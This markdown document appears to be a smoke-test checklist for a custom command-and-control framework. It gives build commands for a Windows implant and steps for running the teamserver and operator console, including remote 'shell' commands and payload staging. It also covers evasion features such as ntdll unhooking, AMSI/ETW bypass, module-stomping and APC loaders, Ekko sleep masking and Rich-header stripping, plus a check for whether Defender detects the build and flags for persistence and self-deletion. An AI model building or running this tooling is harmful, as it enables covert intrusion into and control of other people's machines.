# Smoke checklist

## A. Network-first boot + durable server

1. Build the default (no loader, network-first) profile:

```powershell
cmake -S client -B client/build -G "Visual Studio 17 2022" -A x64
cmake --build client/build --config Release
```

Leave `-DC2_EARLY_EVASION` off — unhook before network can break WinHTTP.

2. Start the teamserver (plain HTTP on `:8443`):

```powershell
python -m c2
```

State: `c2/data/c2.db` (`C2_DB` overrides). Staging payload: `c2/data/stage_payload.bin`.

3. Run the EXE. Expect `%TEMP%\c2_client_stage.log` to include:

```
start
bind-ntdll
syscalls
hwbp
loader
beacon
tx-init
register-ok
post-checkin
post-amisetw
post-restore-ntdll
post-checkin-done
beacon-loop
```

4. Operator console:

```
c2> use
c2> shell whoami
c2> results
```

5. Restart survival: stop the server (Ctrl+C), start again, confirm the same agent in `agents` (session key restored). Implant should keep beaconing; if the DB was wiped, it re-registers on `unknown_agent`.

6. Staging:

```
c2> upload-stage path\to\payload.bin
c2> stage http://127.0.0.1:8443/stage/payload
c2> results
```

## B. Redirector (optional)

See [infra/README.md](../infra/README.md). Enable the `redirector` profile or rebuild with host/port pointing at `:443`.

## C. Loader variants

```powershell
cmake -S client -B client/build-stomp -G "Visual Studio 17 2022" -A x64 -DC2_LOADER=STOMP
cmake --build client/build-stomp --config Release
```

STOMP must not target `winhttp.dll` (that kills the C2 channel).

```powershell
cmake -S client -B client/build-apc -G "Visual Studio 17 2022" -A x64 -DC2_LOADER=APC
cmake --build client/build-apc --config Release
```

## D. Failover / long-haul

- Block the primary port; after consecutive beacon failures the client backs off and rotates profiles (`fallback_after_failures`).
- Kill/restart the teamserver with an empty DB: implant should log `unknown-agent-reregister` and check in again.

## E. Ekko / Rich strip

Ekko sleep: process still beacons after sleep. Optional Rich strip:

```powershell
cmake -S client -B client/build-strip -G "Visual Studio 17 2022" -A x64 -DC2_STRIP_RICH=ON
python client/tools/strip_rich.py client/build-strip/Release/c2_client.exe
```

## F. Local Defender

```powershell
.\tools\validate_defender.ps1 -Build
```

Exit `0` = no detection; `1` = detected; `2` = Defender CLI unavailable. Local Defender only.

## CMake flags

| Flag | Default | Effect |
|------|---------|--------|
| `C2_EARLY_EVASION` | OFF | Unhook/AMSI/ETW before network (risky) |
| `C2_SANDBOX_ABORT` | OFF | Exit if sandbox heuristics fire |
| `C2_PERSIST` | OFF | Registry Run key after beacon |
| `C2_SELF_DEL` | OFF | Self-delete on exit |
| `C2_HOST_OVERRIDE` / `C2_PORT_OVERRIDE` | empty | Override primary transport |
